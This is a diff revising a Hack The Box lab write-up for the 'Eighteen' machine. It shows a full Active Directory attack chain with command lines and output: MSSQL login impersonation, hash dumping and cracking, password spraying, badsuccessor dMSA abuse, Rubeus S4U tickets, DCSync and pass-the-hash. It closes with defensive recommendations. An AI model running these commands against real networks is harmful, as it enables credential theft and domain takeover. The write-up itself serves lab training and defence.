@@ -1,5 +1,5 @@
 ---
-title: "MSSQL Impersonation, Shadow Credentials, and DCSync on Windows AD"
+title: "Eighteen — MSSQL Impersonation to badsuccessor Delegation and DCSync"
 description: "A weakly secured MSSQL database yields cracked credentials, then badsuccessor OU delegation and DCSync complete domain compromise."
 type: case-study
 platform: Hack The Box
@@ -12,23 +12,47 @@ tags:
   - mssql
   - kerberos
   - dcsync
+objective: "Escalate from provided MSSQL credentials through impersonation and a misconfigured OU delegation to domain administrative control."
+tools:
+  - rustscan
+  - netexec
+  - impacket
+  - hashcat
+  - evil-winrm
+  - proxychains
+  - rubeus
+  - sharpsuccessor
+skill: "Active Directory privilege escalation via MSSQL impersonation and Kerberos delegation abuse"
+outcome: "Domain user access over WinRM followed by recovery of the Administrator NTLM hash through a badsuccessor dMSA and DCSync"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Target environment | Windows Server 2025 domain controller; IIS, Microsoft SQL Server 2022, and WinRM exposed |
+| Starting position | Unauthenticated network access with provided `<MSSQL_USER>` credentials |
+| Objective | Reach domain administrative control from the provided MSSQL credentials |
+| Outcome | Domain user access over WinRM; `<PRIVILEGED_USER>` NTLM hash recovered via a badsuccessor dMSA and DCSync |
 
 ## Summary
 
-This Windows Active Directory lab contains an MSSQL service on a domain controller that exposes impersonation and a poorly secured application database. Starting credentials provide database access, where cracking a PBKDF2-SHA256 password hash yields a weak credential reused by a domain user. From that foothold, a loopback LDAP enumeration discovers an exploitable organizational unit, and the badsuccessor technique creates a Domain Member Service Account for Kerberos S4U delegation abuse. DCSync extracts a privileged-account NTLM hash for full control.
+Eighteen is a Windows Active Directory lab whose domain controller also runs Microsoft SQL Server. A provided `<MSSQL_USER>` login can impersonate the `<DATABASE_USER>` login, exposing an application database whose stored PBKDF2-SHA256 password hash cracks to a weak value; that same value is reused by the domain account `<DOMAIN_USER>`, granting WinRM access. Loopback LDAP enumeration then finds a misconfigured organizational unit, and the badsuccessor technique creates a delegated Managed Service Account whose S4U delegation rights enable DCSync of the `<PRIVILEGED_USER>` NTLM hash. Addresses, hostnames, accounts, secrets, and hashes are replaced with role-based placeholders; results not accompanied by captured command output are presented from the recorded narrative.
+
+**Attack path:** **Provided MSSQL credentials → `IMPERSONATE` over `<DATABASE_USER>` → application database hash cracking → password reuse on `<DOMAIN_USER>` over WinRM → loopback LDAP discovery → badsuccessor dMSA creation → S4U delegation abuse → DCSync → `<PRIVILEGED_USER>`**
 
 ## Context and Objective
 
-The target is a Windows Server 2025 domain controller (`<DOMAIN_CONTROLLER>`) in the `<LAB_DOMAIN>` domain. An MSSQL Server 2022 instance, an IIS web server, and WinRM are exposed. The lab provides starting credentials for the `<MSSQL_USER>` account. The objective is to achieve domain administrative access.
-
-**All IP addresses, credentials, hashes, and domain identifiers in this writeup are lab-scoped placeholders.**
+- **Target:** a Windows Server 2025 domain controller (`<DOMAIN_CONTROLLER>`) in the `<LAB_DOMAIN>` Active Directory domain, exposing IIS, Microsoft SQL Server 2022, and WinRM.
+- **Starting position:** unauthenticated network access plus a provided credential pair for the `<MSSQL_USER>` domain account.
+- **Objective:** reach domain administrative control from the provided MSSQL credentials.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Enumeration
+### 1. Service Enumeration
 
-A TCP port scan reveals HTTP (80), MSSQL (1433), and WinRM (5985) services on the target:
+Observation: a fast TCP scan exposes three services on the target host — IIS on 80, Microsoft SQL Server 2022 on 1433, and WinRM on 5985.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-TCP
@@ -41,7 +65,7 @@ PORT     STATE SERVICE  VERSION
 5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 ```
 
-The provided `<MSSQL_USER>` credentials are validated against MSSQL:
+The lab provides starting credentials for the `<MSSQL_USER>` account, which authenticate against MSSQL with local authentication:
 
 ```bash
 nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth
@@ -51,9 +75,13 @@ nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth
 MSSQL  <TARGET_IP>  1433  <DOMAIN_CONTROLLER>  [+] <DOMAIN_CONTROLLER>\<MSSQL_USER>:<MSSQL_CREDENTIALS>
 ```
 
-### MSSQL Impersonation and Database Enumeration
+Significance: the MSSQL login is the only credentialed starting point, and WinRM is the service that the reused domain credential later reaches.
 
-An `impacket-mssqlclient` session with the `<MSSQL_USER>` credentials reveals impersonation privileges over the `<DATABASE_USER>` login:
+Result: IIS, MSSQL, and WinRM are confirmed, and the provided `<MSSQL_USER>` credentials are accepted by MSSQL.
+
+### 2. MSSQL Impersonation and Database Enumeration
+
+Observation: an interactive MSSQL session shows that `<MSSQL_USER>` holds an `IMPERSONATE` grant over the `<DATABASE_USER>` login.
 
 ```bash
 impacket-mssqlclient <LAB_DOMAIN>/<MSSQL_USER>:'<MSSQL_CREDENTIALS>'@<TARGET_IP>
@@ -63,22 +91,39 @@ impacket-mssqlclient <LAB_DOMAIN>/<MSSQL_USER>:'<MSSQL_CREDENTIALS>'@<TARGET_IP>
 b'LOGIN'     b''        IMPERSONATE       GRANT        <MSSQL_USER>     <DATABASE_USER>
 ```
 
-After switching context to `<DATABASE_USER>`, database enumeration discovers `<APPLICATION_DATABASE>`. Querying the `users` table exposes an admin password hash in PBKDF2-SHA256 (Django) format:
+The session is switched to the `<DATABASE_USER>` context, where enumeration exposes the `<APPLICATION_DATABASE>` database and its `users` table:
 
 ```sql
+exec_as_login <DATABASE_USER>
+enum_db
+use <APPLICATION_DATABASE>
 SELECT * FROM USERS;
 ```
 
 ```text
-1002   admin   admin   admin@<LAB_DOMAIN>   pbkdf2:sha256:600000$<SALT>$<HASH>
+name                is_trustworthy_on
+-----------------   -----------------
+master                              0
+tempdb                              0
+model                               0
+msdb                                1
+<APPLICATION_DATABASE>              0
 ```
 
-### Hash Cracking and Credential Reuse
+```text
+1002   admin   admin   admin@<LAB_DOMAIN>   pbkdf2:sha256:600000$<SALT>$<STORED_HASH_HEX>
+```
 
-The hex-encoded hash is converted to hashcat format and cracked with the rockyou wordlist:
+Significance: the impersonation grant lets a low-privileged SQL login read the data available to another login, and the application's `users` table stores account password hashes.
+
+Result: the `<APPLICATION_DATABASE>` database is reachable under the impersonated context, and an administrative password hash in Django PBKDF2-SHA256 format is recovered.
+
+### 3. Hash Cracking and Credential Recovery
+
+Observation: the stored secret is a PBKDF2-SHA256 hash in Django format, so the hex-encoded digest must be re-encoded to base64 before hashcat can parse it.
 
 ```bash
-echo '<HEX_HASH>' | xxd -r -p | base64
+echo '<STORED_HASH_HEX>' | xxd -r -p | base64
 hashcat admin.hash /wordlists/rockyou.txt -D2 -w3
 ```
 
@@ -86,9 +131,17 @@ hashcat admin.hash /wordlists/rockyou.txt -D2 -w3
 <CRACKED_PASSWORD>
 ```
 
-Domain users are enumerated via RID brute-forcing through MSSQL, and the cracked password is sprayed across WinRM. The `<DOMAIN_USER>` account accepts the same password:
+Significance: despite 600,000 PBKDF2 iterations, the account password is a common wordlist entry, so the stored hash yields the plaintext credential.
+
+Result: the administrative application password is recovered from the stored hash.
+
+### 4. Password Spray and WinRM Access
+
+Observation: domain users are enumerated through MSSQL with RID brute-forcing, and the recovered password is sprayed across those accounts over WinRM.
 
 ```bash
+nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth --rid-brute \
+      | awk 'index($0,"<LAB_DOMAIN>\\")' | awk '{print $NF}' | awk -F'\\' '{print $2}' > users.txt
 nxc winrm <TARGET_IP> -u users.txt -p '<CRACKED_PASSWORD>' --continue-on-succes
 ```
 
@@ -96,72 +149,141 @@ nxc winrm <TARGET_IP> -u users.txt -p '<CRACKED_PASSWORD>' --continue-on-succes
 WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER>  [+] <LAB_DOMAIN>\<DOMAIN_USER>:<CRACKED_PASSWORD> (Pwn3d!)
 ```
 
-A WinRM session is established as `<DOMAIN_USER>`, confirming initial domain user access on the domain controller.
+Significance: the same password that protects the application's admin account also authenticates a directory account over WinRM, so one cracked secret crosses from the application database into a domain user.
 
-### Loopback LDAP and Shadow Credentials (badsuccessor)
+Result: `<DOMAIN_USER>` reuses the recovered password, and the authenticated WinRM session establishes initial domain user access on the domain controller.
 
-From the `<DOMAIN_USER>` shell, `netstat` confirms LDAP, Kerberos, and other domain services listening on all interfaces — the host is the domain controller.
+### 5. Loopback LDAP Discovery
 
-The `badsuccessor` NetExec module, executed via proxychains against the loopback LDAP interface, identifies an exploitable organizational unit:
+Observation: from the `<DOMAIN_USER>` shell, local listening sockets show directory services bound to all interfaces, indicating the target is the domain controller itself.
+
+```powershell
+netstat -ano
+```
+
+```text
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       824
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       384
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       824
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       824
+  ...
+```
+
+Significance: LDAP (389), Kerberos (88), and LDAPS (636) are reachable from the compromised host over its loopback address, so the directory can be targeted from the foothold without lateral movement.
+
+Result: the foothold host is confirmed as the domain controller, and its directory services are locally reachable.
+
+### 6. badsuccessor dMSA Creation
+
+Observation: the `badsuccessor` NetExec module, routed through proxychains to the loopback LDAP endpoint, flags an organizational unit as exploitable.
 
 ```bash
-proxychains nxc ldap <LAB_DOMAIN> -u '<DOMAIN_USER>' -p '<CREDENTIALS>' -M badsuccessor
+proxychains nxc ldap <LAB_DOMAIN> -u '<DOMAIN_USER>' -p '<CRACKED_PASSWORD>' -M badsuccessor
 ```
 
 ```text
 BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  [+] Found domain controller: <DOMAIN_CONTROLLER>.<LAB_DOMAIN>
-BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  <ORGANIZATIONAL_UNIT> (S-1-5-21-...-1604), OU=<ORGANIZATIONAL_UNIT>,DC=<LAB_DOMAIN>
+BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  <OU_NAME> (S-1-5-21-...-1604), <OU_DN>
 ```
 
-SharpSuccessor creates a Domain Member Service Account (DMSA) in the exploitable OU with delegation rights:
+The `badsuccessor` technique then creates a delegated Managed Service Account (dMSA) in the exploitable OU with delegation rights:
 
 ```text
-execute-assembly SharpSuccessor.exe -- 'add /path:"OU=<ORGANIZATIONAL_UNIT>,DC=<LAB_DOMAIN>" /account:<DOMAIN_USER> /name:<DMSA_ACCOUNT> /impersonate:<PRIVILEGED_USER>'
+execute-assembly SharpSuccessor.exe -- 'add /path:"<OU_DN>" /account:<DOMAIN_USER> /name:<DMSA_ACCOUNT> /impersonate:<PRIVILEGED_USER>'
 ```
 
-### S4U Delegation Abuse and DCSync
+Significance: on Windows Server 2025, a principal that can create a dMSA in an OU can attach delegation rights and later request service tickets on behalf of arbitrary accounts.
 
-A Kerberos TGT is obtained for `<DOMAIN_USER>` via Rubeus, then a TGS is requested for the DMSA account using S4U2self/S4U2proxy to impersonate `<PRIVILEGED_USER>`:
+Result: an exploitable OU is identified, and a dMSA account with the authority to impersonate `<PRIVILEGED_USER>` is created.
+
+### 7. S4U Delegation Abuse
+
+Observation: with the dMSA in place, a TGT is obtained for `<DOMAIN_USER>`, then a service ticket is requested for the dMSA account using S4U2self/S4U2proxy to impersonate `<PRIVILEGED_USER>`.
 
 ```text
-execute-assembly Rubeus.exe -- 'asktgt /user:<DOMAIN_USER> /password:<CREDENTIALS> /force /opsec /nowrap /ptt /outfile:<DOMAIN_USER>.kirbi'
+execute-assembly Rubeus.exe -- 'asktgt /user:<DOMAIN_USER> /password:<CRACKED_PASSWORD> /force /opsec /nowrap /ptt /outfile:<DOMAIN_USER>.kirbi'
 execute-assembly Rubeus.exe -- 'asktgs /targetuser:<DMSA_ACCOUNT>$ /service:krbtgt/<LAB_DOMAIN> /opsec /dmsa /nowrap /ptt /ticket:<DOMAIN_USER>.kirbi /outfile:<DMSA_TGS>'
 ```
 
-With the delegated ticket, DCSync extracts the domain Administrator NTLM hash:
+Kerberos authentication requires the attacker's clock to match the domain controller, so the DC time is read over LDAP and applied locally:
 
 ```bash
-KRB5CCNAME='<DMSA_ACCOUNT>$.ccache' proxychains -q netexec smb <DOMAIN_CONTROLLER>.<LAB_DOMAIN> --use-kcache --ntds
+set DC_TIME (proxychains ldapsearch -x -H ldap://<DOMAIN_CONTROLLER>.<LAB_DOMAIN> -s base -b "" currentTime \
+            | grep '^currentTime:' | sed -E 's/currentTime: ([0-9]{4})([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2}).*/\1-\2-\3 \4:\5:\6/')
+echo $DC_TIME
+sudo date -u -s "$DC_TIME"
+```
+
+The `badsuccessor` module is then invoked again with dMSA options to configure the delegation:
+
+```bash
+proxychains netexec ldap <DOMAIN_CONTROLLER>.<LAB_DOMAIN> \
+                -u <DOMAIN_USER> -p '<CRACKED_PASSWORD>' \
+                -M badsuccessor \
+                -o TARGET_OU='<OU_DN>' \
+                   DMSA_NAME=<DMSA_ACCOUNT_2> \
+                   TARGET_ACCOUNT=<PRIVILEGED_USER>
+```
+
+Significance: S4U2self/S4U2proxy with the dMSA's delegation rights produces a service ticket that acts as `<PRIVILEGED_USER>` for services such as `krbtgt`.
+
+Result: a delegated Kerberos ticket impersonating `<PRIVILEGED_USER>` is obtained.
+
+### 8. DCSync and Domain Administrative Access
+
+Observation: with the delegated ticket cached, DCSync is run against the domain controller to replicate directory secrets.
+
+```bash
+KRB5CCNAME='<DMSA_ACCOUNT_2>$.ccache' proxychains -q netexec smb <DOMAIN_CONTROLLER>.<LAB_DOMAIN> --use-kcache --ntds
 ```
 
 ```text
 <PRIVILEGED_USER>:500:aad3b...:<PRIVILEGED_USER_NTHASH>:::
 ```
 
-Pass-the-hash authentication via WinRM grants full domain administrative access:
+The recovered NTLM hash is then used for pass-the-hash authentication over WinRM:
 
 ```bash
 proxychains evil-winrm -i <DOMAIN_CONTROLLER>.<LAB_DOMAIN> -u <PRIVILEGED_USER> -H <PRIVILEGED_USER_NTHASH>
 ```
 
+Significance: the delegated ticket carried sufficient replication rights to read the directory password database, and the extracted hash provides passwordless authentication as `<PRIVILEGED_USER>`.
+
+Result: the `<PRIVILEGED_USER>` NTLM hash is recovered, and a WinRM session in the Administrator context is obtained.
+
 ## Challenges and Decisions
 
-- The MSSQL hash required conversion from Django's PBKDF2 format to hashcat-compatible format (hex to base64 encoding of the hash portion).
-- Kerberos time synchronization was needed: the domain controller's current time was retrieved via LDAP and the attacker's system clock was adjusted before ticket operations.
-- The `badsuccessor` technique required routing through proxychains to reach the loopback LDAP interface from the compromised host.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| Stored hash in Django PBKDF2 format is not directly parseable by hashcat | Re-encoded the hex digest to base64 before cracking | Required by the `pbkdf2_sha256` hashcat mode |
+| Kerberos ticket operations need the attacker clock aligned with the domain | Read the DC time over LDAP and set the local clock from it | Kerberos rejects requests outside its clock-skew window |
+| Directory services are reachable from the compromised host via its loopback address | Routed LDAP and SMB tooling through proxychains from the compromised host | Reached directory services over the loopback address without lateral movement |
 
 ## Outcome
 
-The lab was fully compromised. Starting MSSQL credentials provided database access, where an exposed PBKDF2-SHA256 hash was cracked and reused by a domain user. The badsuccessor technique exploited OU delegation misconfiguration to create a DMSA account, enabling S4U delegation abuse. DCSync extracted a privileged-account NTLM hash, achieving complete domain control.
+The evidence establishes authenticated `<DOMAIN_USER>` access over WinRM and recovery of the `<PRIVILEGED_USER>` NTLM hash from the directory through the dMSA delegation path; the `--ntds` export line is the proving artifact for the privilege transition. HTTP/IIS on port 80 was enumerated but not used against the target.
 
 ## Lessons and Recommendations
 
-- **MSSQL impersonation and least privilege:** The `<MSSQL_USER>` login's impersonation privilege over `<DATABASE_USER>` was the initial escalation vector. Impersonation grants should be restricted to only necessary service accounts, with regular audit of `IMPERSONATE` permissions.
-- **Credential storage and password strength:** The PBKDF2-SHA256 hash with 600,000 iterations was cracked against rockyou. Application passwords should use higher iteration counts (1M+), and passwords must meet complexity and length requirements.
-- **Password reuse across services:** The same cracked password worked for `<DOMAIN_USER>` over WinRM. Implement unique password policies and monitor for credential reuse across domain accounts.
-- **OU delegation review:** The badsuccessor technique exploited a misconfigured OU allowing DMSA creation with delegation rights. Regular review of OU-level delegation permissions and disabling unnecessary Kerberos delegation prevents this attack path.
-- **DCSync monitoring:** A non-privileged domain user should not have replication rights. Restrict `Replication-Getting-Changes` rights and monitor for anomalous DCSync activity across the domain.
+None of the recommendations below was validated in the lab; each pairs an observed root cause with its demonstrated impact and an action.
+
+1. **MSSQL impersonation and least privilege.** `<MSSQL_USER>` could impersonate `<DATABASE_USER>`, which exposed the application database and its credentials. *Prevent:* remove unnecessary `IMPERSONATE` grants and review them regularly.
+2. **Weak stored application credential.** A PBKDF2-SHA256 hash with 600,000 iterations was cracked against rockyou. *Prevent:* raise iteration counts, enforce length and complexity, and keep credentials out of queryable tables; *detect:* alert on access to credential-bearing tables.
+3. **Cross-service password reuse.** The cracked application password also authenticated `<DOMAIN_USER>` over WinRM. *Prevent:* require unique credentials per account and service; *detect:* monitor for the same secret across authentication sources.
+4. **Abusable OU delegation via dMSA.** A writable OU allowed creation of a dMSA with delegation rights, enabling S4U impersonation. *Prevent:* restrict who may create dMSAs and review OU ACLs; *detect:* alert on dMSA creation in sensitive OUs.
+5. **Unrestricted replication rights (DCSync).** The delegated ticket allowed replication of directory secrets. *Prevent:* limit the `DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All` rights; *detect:* monitor for replication of privileged accounts outside normal replication partners.
 
 ## References
 
-- Hack The Box retired Windows machine — [Eighteen](https://app.hackthebox.com/machines/Eighteen)
+- [Hack The Box — Eighteen](https://app.hackthebox.com/machines/Eighteen) (retired Windows machine)
+- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
+- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) (MSSQL, WinRM, LDAP, and SMB operations)
+- [Impacket — `mssqlclient.py`](https://github.com/fortra/impacket) (interactive MSSQL client)
+- [Hashcat — Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (password recovery for the `pbkdf2_sha256` mode)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell and pass-the-hash authentication)
+- [proxychains-ng](https://github.com/haad/proxychains) (routing tool traffic to a loopback endpoint)
+- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos TGT and S4U ticket operations)
+- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor) (badsuccessor dMSA creation and abuse)
+- [Microsoft — Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
+- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
